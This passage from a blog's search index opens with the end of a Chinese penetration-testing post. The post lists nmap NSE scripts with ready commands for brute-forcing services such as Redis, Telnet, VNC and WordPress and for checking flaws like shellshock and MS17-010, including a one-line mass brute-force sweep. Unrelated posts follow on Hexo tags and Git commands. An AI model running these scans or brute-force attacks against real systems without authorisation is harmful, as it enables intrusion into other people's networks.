27017  --script mongodb-brute 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>redis-brute.nse   redis爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 6379 --script redis-brute.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x09-和snmp相关的一些扫描脚本"><a href="#0x09-和snmp相关的一些扫描脚本" class="headerlink" title="0x09 和snmp相关的一些扫描脚本:"></a>0x09 和snmp相关的一些扫描脚本:</h3><p>snmp-brute.nse   爆破C段的snmp </p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb<span class="token operator">=</span>user.txt 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x10-和telnet相关的一些扫描脚本"><a href="#0x10-和telnet相关的一些扫描脚本" class="headerlink" title="0x10 和telnet相关的一些扫描脚本:"></a>0x10 和telnet相关的一些扫描脚本:</h3><p>telnet-brute.nse   简单爆破telnet</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 23 --script telnet-brute --script-args userdb<span class="token operator">=</span>myusers.lst,passdb<span class="token operator">=</span>mypwds.lst,telnet-brute.timeout<span class="token operator">=</span>8s -v 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x11-和ldap服务相关的一些利用脚本"><a href="#0x11-和ldap服务相关的一些利用脚本" class="headerlink" title="0x11 和ldap服务相关的一些利用脚本:"></a>0x11 和ldap服务相关的一些利用脚本:</h3><p>ldap-brute.nse   简单爆破ldap</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 389 --script ldap-brute --script-args ldap.base<span class="token operator">=</span><span class="token string">'"cn=users,dc=cqure,dc=net"'</span> 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x12-和各类web中间件-web集成环境相关的一些利用脚本"><a href="#0x12-和各类web中间件-web集成环境相关的一些利用脚本" class="headerlink" title="0x12 和各类web中间件,web集成环境相关的一些利用脚本:"></a>0x12 和各类web中间件,web集成环境相关的一些利用脚本:</h3><p>xmpp-brute.nse    xmpp爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 5222 --script xmpp-brute.nse  192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-iis-short-name-brute.nse       短文件扫描</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p80 --script http-iis-short-name-brute.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-iis-webdav-vuln.nse       iis 5.0 /6.0 webadv写</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-bashshock.nse      bash远程执行</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sV -p- --script http-bashshock --script-args uri<span class="token operator">=</span>/cgi-bin/bin,cmd<span class="token operator">=</span>ls 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-svn-info.nse       探测目标svn</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script http-svn-info 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-drupal-enum.nse        其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来<br>http-wordpress-brute.nse</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p80 -sV --script http-wordpress-brute --script-args <span class="token string">'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true'</span> 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-backup-finder.nse   扫描目标网站备份</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p80 --script<span class="token operator">=</span>http-backup-finder 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>http-vuln-cve2015-1635.nse   iis6.0远程代码执行</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sV --script http-vuln-cve* --script-args uri<span class="token operator">=</span><span class="token string">'/anotheruri/'</span>  192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x13-跟vpn相关的一些利用脚本-暂时只看到一个pptp还好使"><a href="#0x13-跟vpn相关的一些利用脚本-暂时只看到一个pptp还好使" class="headerlink" title="0x13 跟vpn相关的一些利用脚本,暂时只看到一个pptp还好使:"></a>0x13 跟vpn相关的一些利用脚本,暂时只看到一个pptp还好使:</h3><p>pptp-version.nse   识别目标pptp版本</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1723 --script pptp-version.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x14-smb漏洞检测脚本集"><a href="#0x14-smb漏洞检测脚本集" class="headerlink" title="0x14 smb漏洞检测脚本集::"></a>0x14 smb漏洞检测脚本集::</h3><p>smb-vuln-ms08-067.nse<br>smb-vuln-ms10-054.nse<br>smb-vuln-ms10-061.nse<br>smb-vuln-ms17-010.nse       smb远程执行</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p445 --script smb-vuln-ms17-010.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x15-检测内网嗅探-实际测试中-貌似并没什么卵用-难道是我实验有误"><a href="#0x15-检测内网嗅探-实际测试中-貌似并没什么卵用-难道是我实验有误" class="headerlink" title="0x15 检测内网嗅探,实际测试中,貌似并没什么卵用,难道是我实验有误"></a>0x15 检测内网嗅探,实际测试中,貌似并没什么卵用,难道是我实验有误</h3><p>sniffer-detect.nse</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sn -Pn --script sniffer-detect.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x16-其它的一些辅助性脚本"><a href="#0x16-其它的一些辅助性脚本" class="headerlink" title="0x16 其它的一些辅助性脚本:"></a>0x16 其它的一些辅助性脚本:</h3><p>rsync-brute.nse     爆破目标的rsync</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 873 --script rsync-brute --script-args <span class="token string">'rsync-brute.module=www'</span> 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>rlogin-brute.nse     爆破目标的rlogin</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 513 --script rlogin-brute 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>vnc-brute.nse       爆破目标的vnc</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script vnc-brute -p 5900 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pcanywhere-brute.nse     爆破pcanywhere</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 5631 --script<span class="token operator">=</span>pcanywhere-brute 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nessus-brute.nse     爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script nessus-brute -p 1241 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nexpose-brute.nse     爆破nexpose</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script nexpose-brute -p 3780 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>shodan-api.nse      配合shodan接口进行扫描,如果自己手里有0day,这个威力还是不可小觑的</p><pre class="line-numbers language-bash"><code class="language-bash">nmap --script shodan-api --script-args <span class="token string">'shodan-api.target=192.168.3.0/24,shodan-api.apikey=SHODANAPIKEY'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x17-尝试利用nmap一句话进行目标C段常规漏洞扫描"><a href="#0x17-尝试利用nmap一句话进行目标C段常规漏洞扫描" class="headerlink" title="0x17 尝试利用nmap一句话进行目标C段常规漏洞扫描"></a>0x17 尝试利用nmap一句话进行目标C段常规漏洞扫描</h3><p>实际测试中,会非常的慢,可能跑一个脚本验证时间都要很长,尤其在你的vps带宽不是很足,网络又不怎么好的时候,速度就更慢了,所以还是建议先大致扫一眼目标服务,然后再单独针对性的扫,这样实际的成功率可能会高很多,毕竟,不是像masscan或者zamp这种基于无状态的扫描:</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sT -Pn -v --script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-bashshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012-1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试利用nmap一句话进行目标C段弱口令爆破,还是上面的问题,验证一个漏洞都要那么久,更不要说跑完一个弱口令字典,nmap默认的弱口令字典大概是5000左右,也就是说一个用户名就要跑大概5000次,估计你vps带宽再小点儿的话,这个就没什么谱了,毕竟我们是在公网,不是在内网,所以,还是建议最好不要同时加载很多个弱口令爆破脚本,如果实在没办法必须爆破,可以多花点儿时间,去搜集目标有价值的用户名,以此尽可能提高自己的命中率:</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sT -v -Pn --script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.3.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x18后话"><a href="#0x18后话" class="headerlink" title="0x18后话:"></a>0x18后话:</h3><p> 由于nmap内置丰富的漏洞扫描脚本,也使得nmap的能力在一定程度得到了极大的扩展,意味者我们完全可以自己按照nmap事先规定好的语法来模仿实现一些简单的定制扫描,这也是让我感觉nmap做的非常好的一点,极大的可扩展性,比如,你自己握有0day时,想自动化干点儿什么事儿,嘿嘿……具体就不多说了,相信大家都懂, 希望不要撞到别人的蜜罐中去就好了,不然Nday就可惜了  ,没错,masscan,zmap这种基于无状态的扫描确实快的吓人,而且shodan api也是个很不错的选择,但对定制脚本支持始终还是差了点,时间关系只挑了一些可能用到的脚本,今天就简单聊到这儿吧,工具没有没有好坏,虽然实战中不一定都能用上,关键还是大家在实际渗透过程中能灵活变通就好,话说回来,这一切的前提都是建立在别人让你扫的基础之上的,nmap的标志实在是太招摇过市了,nmap所支持的那几种扫描类型,估计早已被各种ids所免疫,说实话,有些目标可能都没什么机会让你扫,关于nmap其它的一些用法,后期遇到相对比较实用的会不定期再更新上来,大家如果有兴趣,也可以直接去参考官方,那里说的还是非常详细的,起码比我这个要详细很多,有任何问题请直接私信我</p>]]></content>
      
      
      <categories>
          
          <category> PenTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenTest </tag>
            
            <tag> PenTestTool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo使用tags错误</title>
      <link href="/2019/03/24/hexo-shi-yong-tags-cuo-wu/"/>
      <url>/2019/03/24/hexo-shi-yong-tags-cuo-wu/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><pre><code>tags:  - tag1  - tag2</code></pre><h4 id="添加标签-tag"><a href="#添加标签-tag" class="headerlink" title="添加标签(tag)"></a>添加标签(tag)</h4><p>hexo new page tags</p><ol><li>站点_config.yml中有tag_dir: tags</li><li>主题配置(theme/_config.yml)文件里有tags: /tags</li><li>编辑站点的source/tags/index.md，添加<pre><code>title: tagsdate: 2015-10-20 06:49:50type: tagscomments: false</code></pre></li></ol><h4 id="添加分类-categories"><a href="#添加分类-categories" class="headerlink" title="添加分类(categories)"></a>添加分类(categories)</h4><p> hexo new page categories</p><ol><li>站点_config.yml中有tag_dir: categories</li><li>主题配置(theme/_config.yml)categories: /categories</li><li>编辑站点的source/categories/index.md，添加<pre><code>title: categoriesdate: 2015-10-20 06:49:50type: categoriescomments: false</code></pre></li></ol><p>编辑好后 hexo g 重新生成静态即可</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git常用命令大全</title>
      <link href="/2019/01/21/git-chang-yong-ming-ling-da-quan/"/>
      <url>/2019/01/21/git-chang-yong-ming-ling-da-quan/</url>
      
        <content type="html"><![CDATA[<h2 id="Git常用命令"><a href="#Git常用命令" class="headerlink" title="Git常用命令"></a>Git常用命令</h2><a id="more"></a><h3 id="最常用命令"><a href="#最常用命令" class="headerlink" title="最常用命令"></a>最常用命令</h3><h5 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h5><p>git add -A * -f  添加文件<br>git commit -m “v0.1”</p><h5 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h5><p>git push -u origin master</p><h5 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h5><p>git rm -r –cached  名字<br>git commit -m “<strong>**</strong>“<br>git push -u origin master</p><hr><h3 id="Git-常用命令速查"><a href="#Git-常用命令速查" class="headerlink" title="Git 常用命令速查"></a>Git 常用命令速查</h3><p>git branch 查看本地所有分支<br>git status 查看当前状态<br>git commit 提交<br>git branch -a 查看所有的分支<br>git branch -r 查看远程所有分支<br>git commit -am “init” 提交并且加注释<br>git remote add origin <a href="mailto:git@192.168.1.119" target="_blank" rel="noopener">git@192.168.1.119</a>:ndshow<br>git push origin master 将文件给推到服务器上<br>git remote show origin 显示远程库origin里的资源<br>git push origin master:develop<br>git push origin master:hb-dev 将本地库与服务器上的库进行关联<br>git checkout –track origin/dev 切换到远程dev分支<br>git branch -D master develop 删除本地库develop<br>git checkout -b dev 建立一个新的本地分支dev<br>git merge origin/dev 将分支dev与当前分支进行合并<br>git checkout dev 切换到本地dev分支<br>git remote show 查看远程库<br>git add .<br>git rm 文件名(包括路径) 从git中删除指定文件<br>git clone git://github.com/schacon/grit.git 从服务器上将代码给拉下来<br>git config –list 看所有用户<br>git ls-files 看已经被提交的<br>git rm [file name] 删除一个文件<br>git commit -a 提交当前repos的所有的改变<br>git add [file name] 添加一个文件到git index<br>git commit -v 当你用－v参数的时候可以看commit的差异<br>git commit -m “This is the message describing the commit” 添加commit信息<br>git commit -a -a是代表add，把所有的change加到git index里然后再commit<br>git commit -a -v 一般提交命令<br>git log 看你commit的日志<br>git diff 查看尚未暂存的更新<br>git rm a.a 移除文件(从暂存区和工作区中删除)<br>git rm –cached a.a 移除文件(只从暂存区中删除)<br>git commit -m “remove” 移除文件(从Git中删除)<br>git rm -f a.a 强行移除修改后文件(从暂存区和工作区中删除)<br>git diff –cached 或 $ git diff –staged 查看尚未提交的更新<br>git stash push 将文件给push到一个临时空间中<br>git stash pop 将文件从临时空间pop下来<br>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:username/Hello-World.git<br>git push origin master 将本地项目给提交到服务器中<br>git pull 本地与服务器端同步<br>git push (远程仓库名) (分支名) 将本地分支推送到服务器上去。<br>git fetch 相当于是从远程获取最新版本到本地，不会自动merge<br>git commit -a -m “log_message” (-a是提交所有改动，-m是加入log信息) 本地修改同步至服务器端 ：<br>git branch branch_0.1 master 从主分支master创建branch_0.1分支<br>git branch -m branch_0.1 branch_1.0 将branch_0.1重命名为branch_1.0<br>git checkout branch_1.0/master 切换到branch_1.0/master分支<br>du -hs<br>git branch 删除远程branch<br>git push origin :branch_remote_name<br>git branch -r -d branch_remote_name<br>初始化版本库，并提交到远程服务器端<br>mkdir WebApp<br>cd WebApp<br>git init 本地初始化<br>touch README<br>git add README 添加文件<br>git commit -m ‘first commit’<br>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:daixu/WebApp.git</p><p>增加一个远程服务器端</p><p>上面的命令会增加URL地址为‘git@github.com:daixu/WebApp.git’，名称为origin的远程服务器库，以后提交代码的时候只需要使用 origin别名即可</p><h3 id="命令速查表"><a href="#命令速查表" class="headerlink" title="命令速查表"></a>命令速查表</h3><ol><li><p>常用的Git命令<br>git add 添加至暂存区<br>git add–interactive 交互式添加<br>git apply 应用补丁<br>git am 应用邮件格式补丁<br>git annotate 同义词，等同于 git blame<br>git archive 文件归档打包<br>git bisect 二分查找<br>git blame 文件逐行追溯<br>git branch 分支管理<br>git cat-file 版本库对象研究工具<br>git checkout 检出到工作区、切换或创建分支<br>git cherry-pick 提交拣选<br>git citool 图形化提交，相当于 git gui 命令<br>git clean 清除工作区未跟踪文件<br>git clone 克隆版本库<br>git commit 提交<br>git config 查询和修改配置<br>git describe 通过里程碑直观地显示提交ID<br>git diff 差异比较<br>git difftool 调用图形化差异比较工具<br>git fetch 获取远程版本库的提交<br>git format-patch 创建邮件格式的补丁文件。参见 git am 命令<br>git grep 文件内容搜索定位工具<br>git gui 基于Tcl/Tk的图形化工具，侧重提交等操作<br>git help 帮助<br>git init 版本库初始化<br>git init-db<em> 同义词，等同于 git init<br>git log 显示提交日志<br>git merge 分支合并<br>git mergetool 图形化冲突解决<br>git mv 重命名<br>git pull 拉回远程版本库的提交<br>git push 推送至远程版本库<br>git rebase 分支变基<br>git rebase–interactive 交互式分支变基<br>git reflog 分支等引用变更记录管理<br>git remote 远程版本库管理<br>git repo-config</em> 同义词，等同于 git config<br>git reset 重置改变分支“游标”指向<br>git rev-parse 将各种引用表示法转换为哈希值等<br>git revert 反转提交<br>git rm 删除文件<br>git show 显示各种类型的对象<br>git stage* 同义词，等同于 git add<br>git stash 保存和恢复进度<br>git status 显示工作区文件状态<br>git tag 里程碑管理</p></li><li><p>对象库操作相关命令<br>git commit-tree 从树对象创建提交<br>git hash-object 从标准输入或文件计算哈希值或创建对象<br>git ls-files 显示工作区和暂存区文件<br>git ls-tree 显示树对象包含的文件<br>git mktag 读取标准输入创建一个里程碑对象<br>git mktree 读取标准输入创建一个树对象<br>git read-tree 读取树对象到暂存区<br>git update-index 工作区内容注册到暂存区及暂存区管理<br>git unpack-file 创建临时文件包含指定 blob 的内容<br>git write-tree 从暂存区创建一个树对象</p></li><li><p>引用操作相关命令<br>git check-ref-format 检查引用名称是否符合规范<br>git for-each-ref 引用迭代器，用于shell编程<br>git ls-remote 显示远程版本库的引用<br>git name-rev 将提交ID显示为友好名称<br>git peek-remote* 过时命令，请使用 git ls-remote<br>git rev-list 显示版本范围<br>git show-branch 显示分支列表及拓扑关系<br>git show-ref 显示本地引用<br>git symbolic-ref 显示或者设置符号引用<br>git update-ref 更新引用的指向<br>git verify-tag 校验 GPG 签名的Tag</p></li></ol><ol start="4"><li>版本库管理相关命令<br>git count-objects 显示松散对象的数量和磁盘占用<br>git filter-branch 版本库重构<br>git fsck 对象库完整性检查<br>git fsck-objects<em> 同义词，等同于 git fsck<br>git gc 版本库存储优化<br>git index-pack 从打包文件创建对应的索引文件<br>git lost-found</em> 过时，请使用 git fsck –lost-found 命令<br>git pack-objects 从标准输入读入对象ID，打包到文件<br>git pack-redundant 查找多余的 pack 文件<br>git pack-refs 将引用打包到 .git/packed-refs 文件中<br>git prune 从对象库删除过期对象<br>git prune-packed 将已经打包的松散对象删除<br>git relink 为本地版本库中相同的对象建立硬连接<br>git repack 将版本库未打包的松散对象打包<br>git show-index 读取包的索引文件，显示打包文件中的内容<br>git unpack-objects 从打包文件释放文件<br>git verify-pack 校验对象库打包文件 </li></ol><h3 id="git常用命令表"><a href="#git常用命令表" class="headerlink" title="git常用命令表"></a>git常用命令表</h3><p><img src="git.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你好，朋友</title>
      <link href="/2019/01/21/ni-hao-peng-you/"/>
      <url>/2019/01/21/ni-hao-peng-you/</url>
      
        <content type="html"><![CDATA[<p><img src="haha.png" alt="hello"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
